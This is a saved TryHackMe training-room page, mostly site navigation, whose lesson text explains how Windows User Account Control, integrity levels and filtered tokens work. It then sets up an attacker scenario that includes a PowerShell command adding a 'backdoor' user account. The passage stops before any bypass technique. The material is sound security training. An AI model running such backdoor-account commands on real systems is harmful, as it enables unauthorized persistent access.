      <div class="col-auto text-center"><img height="18" src="./TryHackMe _ Bypassing UAC_files/confetti.png"></div>
      <div class="col p-0">
        <div>Congratulations, you leveled up! You're now level 10.</div>
        <div class="size-12 faded mt-1">27th Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification">
      <div class="col-auto text-center"><i class="fad fa-info-square small text-blue size-14"></i></div>
      <div class="col p-0">
        <div>A King of the Hill game you're in starts soon.  
        <a href="https://tryhackme.com/games/koth/75612">Get ready</a>!</div>
        <div class="size-12 faded mt-1">22nd Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification">
      <div class="col-auto text-center"><img height="18" src="./TryHackMe _ Bypassing UAC_files/confetti.png"></div>
      <div class="col p-0">
        <div>Congratulations, you leveled up! You're now level 9.</div>
        <div class="size-12 faded mt-1">17th Jun 2023</div>
      </div>
    </div>
  </div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/bypassinguac#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Bypassing UAC_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Bypassing UAC_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog" aria-hidden="true" style="display: none;">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Bypassing UAC_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Bypassing UAC_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Bypassing UAC_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/bypassinguac#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications" style="padding: 0px;">
    <div class="row notification">
      <div class="col-auto text-center"><img height="18" src="./TryHackMe _ Bypassing UAC_files/confetti.png"></div>
      <div class="col p-0">
        <div>Congratulations, you leveled up! You're now level 10.</div>
        <div class="size-12 faded mt-1">27th Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification">
      <div class="col-auto text-center"><i class="fad fa-info-square small text-blue size-14"></i></div>
      <div class="col p-0">
        <div>A King of the Hill game you're in starts soon.  
        <a href="https://tryhackme.com/games/koth/75612">Get ready</a>!</div>
        <div class="size-12 faded mt-1">22nd Jun 2023</div>
      </div>
    </div>
  
    <div class="row notification">
      <div class="col-auto text-center"><img height="18" src="./TryHackMe _ Bypassing UAC_files/confetti.png"></div>
      <div class="col p-0">
        <div>Congratulations, you leveled up! You're now level 9.</div>
        <div class="size-12 faded mt-1">17th Jun 2023</div>
      </div>
    </div>
  </div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Bypassing UAC_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Bypassing UAC_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Bypassing UAC_files/notifications.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Bypassing UAC_files/790b5bc214f0a2223074c2c69a71e908.png">
<div>
<div id="room-details" class="">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">433</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Bypassing UAC_files/9c8359d213941312199b6142d3421a57.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Bypassing UAC</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/bypassinguac#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/bypassinguac#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary" style="display: inline-flex;">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/bypassinguac" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Bypassing UAC_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn common ways to bypass User Account Control (UAC) in Windows hosts.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/bypassinguac#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6243492e48d4c800497bc08c">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
        (without being subscribed)! 10155 users are in here and this room is 473 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Bypassing UAC_files/6be6191826f2a6e5a154c13ad8f29d1e.png"> 
        <a class="green-link" href="https://tryhackme.com/p/munra">munra</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info" style="display: none;">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3"><div class="bold">Title</div>bypass-uac_v2.2</div>
<div class="col-sm-3" id="table-machine-ip">
    <div class="bold">IP Address</div>
    <span id="machine-ip">MACHINE_IP</span>
    <i onclick="copyMachineIP()" id="copy-machine-ip" class="fal fa-copy faded hover-pointer size-14" data-toggle="tooltip" title="Copy to clipboard" style="display: none;"></i></div>
<div class="col-sm-3"><div class="bold">Expires</div><span id="expires">1h 18m 46s</span></div>
<div class="col-sm-3">
    <button type="button" class="btn btn-secondary deployment-info" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;)">
        <i class="fas fa-question"></i>
    </button>
    <button class="btn btn-warning deployment-info" onclick="extendVM(&#39;i-0388de2b43a0a0038&#39;)" id="add-vm-time" value="bypassinguac">
        Add 1 hour
    </button>
    <button type="button" class="btn btn-danger deployment-info" id="terminate-vm" onclick="terminateVM(&#39;i-0388de2b43a0a0038&#39;)">
        Terminate
    </button></div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" aria-expanded="true">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>In this room, we will be looking at common ways to bypass a security feature available to Windows systems known as&nbsp;<strong><span>User Account Control (<a class="TbRfbCeg glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;TbRfbCeg&#39;)">UAC</a>).</span></strong>&nbsp;This feature allows for any process to be run with low privileges independent of who runs it (either a regular user or an admin).</p>
<p><span>From an attacker's perspective, bypassing <a class="CYl3b9uh glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;CYl3b9uh&#39;)">UAC</a> is essential to breaking out of highly restrictive environments and fully elevating privileges on target hosts. While learning the bypass techniques, we will also look at any alerts that could be triggered and artefacts that may be created on the target system that the blue team could detect.</span></p>
<h3>Room objectives</h3>
<ul>
<li><span>Learn the different techniques available to attackers to bypass <a class="et81DhaY glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;et81DhaY&#39;)">UAC</a>.</span></li>
</ul>
<h3>Room prerequisites</h3>
<p>It is recommended to go through the <a href="https://tryhackme.com/room/windowsinternals" target="_blank">Windows Internals</a> room before this one.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Click and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse2" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> User Account Control (UAC)
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>What is UAC?</h3>
<p><img style="float:right" src="./TryHackMe _ Bypassing UAC_files/4c9e08e46fb545bd16f1c648e2956a34.png" class="note-float-right"><span>User Account Control (<a class="jc7AEuyp glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;jc7AEuyp&#39;)">UAC</a>) is a Windows security feature that forces any new process to run in the security context of a non-privileged account by default. This policy applies to processes started by any user, including administrators themselves. The idea is that we can't solely rely on the user's identity to determine if some actions should be authorized.</span></p>
<p><span>Although this may seem counterintuitive, imagine the case where user BOB unknowingly downloads a malicious application from the Internet. If BOB is a part of the Administrators group, any application he launches will inherit its access token privileges. So if BOB decides to launch the malicious application and <a class="SX1FquLb glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;SX1FquLb&#39;)">UAC</a> is disabled, the malicious application would gain administrator privileges instantly. Instead, the malicious application will be restricted to a non-administrative access token when UAC is enabled.</span></p><p><br></p>
<h3><span><a class="xTlKXiUF glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;xTlKXiUF&#39;)">UAC</a> Elevation</span></h3>
<p><span>If an administrator is required to perform a privileged task, <a class="R3yIj9OT glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;R3yIj9OT&#39;)">UAC</a> provides a way to elevate privileges. </span><b>Elevation</b> works by presenting a simple dialogue box to the user to confirm that they explicitly approve running the application in an administrative security context:</p><p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/8088062c5a8e61407d343186bba02596.png"></p><p style="text-align:center"><br></p>

<h3>Integrity Levels</h3>
<p><span><a class="9Va7QgUP glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;9Va7QgUP&#39;)">UAC</a> is a </span><strong>Mandatory Integrity Control (MIC)</strong>, which is a mechanism that allows differentiating users, processes and resources by assigning an <strong>Integrity Level (IL)</strong><span> to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows <a class="BjzSrXNh glossary-term" onclick="initPopOver(&#39;DACL&#39;, &#39;BjzSrXNh&#39;)">DACL</a>s, so you may be authorized to access a resource according to the DACL, but it won't matter if your IL isn't high enough.</span></p>
<p><span style="font-size:1rem">The following 4 ILs are used by Windows, ordered from lowest to highest:</span><br></p><table class="table table-bordered"><tbody><tr><td style="text-align:left"><b>Integrity Level</b></td><td style="text-align:left"><b>Use</b></td></tr><tr><td style="text-align:left">Low</td><td style="text-align:left">Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.<br></td></tr><tr><td style="text-align:left">Medium</td><td style="text-align:left">Assigned to standard users and Administrators' filtered tokens.<br></td></tr><tr><td style="text-align:left">High</td><td style="text-align:left"><span>Used by Administrators' elevated tokens if <a class="oEhw5OnJ glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;oEhw5OnJ&#39;)">UAC</a> is enabled. If UAC is disabled, all administrators will always use a high IL token.</span><br></td></tr><tr><td style="text-align:left">System</td><td style="text-align:left">Reserved for system use.</td></tr></tbody></table><p>When a process requires to access a resource, it will inherit the calling user's access token and its associated IL. The same occurs if a process forks a child.</p><p><br></p>

<h3>Filtered Tokens</h3>
<p><span>To accomplish this separation of roles, <a class="HVejjPIb glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;HVejjPIb&#39;)">UAC</a> treats regular users and administrators in a slightly different way during logon:</span></p>
<ul>
<li><strong>Non-administrators</strong> will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.</li>
<li><strong>Administrators</strong> will receive two access tokens:
<ul>
<li><strong>Filtered Token:</strong> A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.</li>
<li><strong>Elevated Token:</strong> A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.</li>
</ul>
</li>
</ul>
<p><span>In this way, administrators will use their filtered token unless they explicitly request administrative privileges via <a class="DutDqdFK glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;DutDqdFK&#39;)">UAC</a>.</span></p><p><br></p>

<h3>Opening an Application the Usual Way</h3>
<p>When trying to open a regular console, we can either open it as a non-privileged user or as an administrator. Depending on our choice, either a Medium or High integrity level token will be assigned to the spawned process:</p><p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/85532945ffd962373592d21f1720ee39.png" style="width:75%"><br></p>
<p>If we analyze both processes using Process Hacker, we can see the associated tokens and their differences :</p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/605235aa87c2f39689d0396bb3603967.png"></p><p>On the left, you have a filtered token with medium IL and almost no privileges assigned. On the right, you can see that the process runs with high IL and has many more privileges available. Another difference that may not be so obvious is that the medium IL process is effectively denied any privileges related to being part of the Administrators group.</p><p><br></p><h3><span><a class="g3aVsxKR glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;g3aVsxKR&#39;)">UAC</a> Settings</span></h3><p><span>Depending on our security requirements, <a class="aN2fj9lD glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;aN2fj9lD&#39;)">UAC</a> can be configured to run at four different notification levels:</span></p><ul><li><b>Always notify:</b> Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.</li><li><b>Notify me only when programs try to make changes to my computer:</b> Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings.</li><li><b>Notify me only when programs try to make changes to my computer (do not dim my desktop): </b><span>Same as above, but won't run the <a class="nMhL4QJO glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;nMhL4QJO&#39;)">UAC</a> prompt on a secure desktop.</span><br></li><li><b>Never notify:</b><span> Disable <a class="FFbkd7on glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;FFbkd7on&#39;)">UAC</a> prompt. Administrators will run everything using a high privilege token.</span></li></ul><p><span>By default, <a class="CqZ2Yd56 glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;CqZ2Yd56&#39;)">UAC</a> is configured on the&nbsp;</span><b>Notify me only when programs try to make changes to my computer</b> level:</p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/143a6c0fd6725edaee0f3d5c707e97f0.png"></p><p style="text-align:left">From an attacker's perspective, the three lower security levels are equivalent, and only the Always notify setting presents a difference.</p><p style="text-align:left"><br></p>

<h3><span><a class="FFqx6DhK glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;FFqx6DhK&#39;)">UAC</a> Internals</span></h3>
<p><span>At the heart of <a class="ti9f6hNP glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;ti9f6hNP&#39;)">UAC</a>, we have the </span><strong>Application Information Service</strong> or <strong>Appinfo</strong>. Whenever a user requires elevation, the following occurs: </p>
<ol>
<li>The user requests to run an application as administrator.</li>
<li>A <strong>ShellExecute</strong> API call is made using the <strong>runas</strong> verb. </li>
<li>The request gets forwarded to Appinfo to handle elevation.</li><li>The application manifest is checked to see if AutoElevation is allowed (more on this later).</li>
<li>Appinfo executes <strong>consent.exe</strong><span>, which shows the <a class="aum0meqU glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;aum0meqU&#39;)">UAC</a> prompt on a </span><strong>secure desktop</strong><span>. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the <a class="MFPbjmop glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;MFPbjmop&#39;)">UAC</a> prompt in any way.</span></li>
<li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:decimal"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token. Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.</span></li></ol><p style="text-align:center"><img src="./TryHackMe _ Bypassing UAC_files/fce906f0e438efa938753430e5d25afe.png"><br></p><p style="text-align:center"><br></p>

<h3><span>Bypassing <a class="S6O1giVd glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;S6O1giVd&#39;)">UAC</a></span></h3>
<p>From an attacker's perspective, there might be situations where you get a remote shell to a Windows host via Powershell or cmd.exe. You might even gain access through an account that is part of the Administrators group, but when you try creating a backdoor user for future access, you get the following error:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Powershell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">            <code class=" language-shell-session"><span class="token output">PS C:\Users\attacker&gt; net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.</span></code>
        </pre>
    </div>
</div>
<p><span style="font-size:1rem">By checking our assigned groups, we can confirm that our session is running with a medium IL, meaning we are effectively using a filtered token:&nbsp;</span><br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Powershell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">            <code class=" language-shell-session"><span class="token output">PS C:\Users\attacker&gt; whoami /groups
	
GROUP INFORMATION
-----------------

Group Name                                                    Attributes
============================================================= ==================================================
Everyone                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Group used for deny only
BUILTIN\Administrators                                        Group used for deny only
BUILTIN\Users                                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group
